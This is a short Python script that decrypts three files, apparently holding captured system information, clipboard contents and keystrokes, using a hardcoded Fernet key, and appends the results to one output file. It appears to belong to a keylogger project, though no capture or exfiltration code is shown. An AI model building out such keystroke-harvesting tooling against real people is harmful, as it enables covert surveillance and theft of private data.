from cryptography.fernet import Fernet

key = "5Al4o0TWkYRiwIhZMWBkumA2CVQsYJVPbBEWhuZnW68="

sys_info_enc="enc_sys.txt"
clipb_info_enc="enc_clip.txt"
keys_info_enc="enc_keys.txt"



encrypted_files = [sys_info_enc, clipb_info_enc, keys_info_enc]
count = 0


for decrypting_files in encrypted_files:

    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open("decryption.txt", 'ab') as f:
        f.write(decrypted)

    count += 1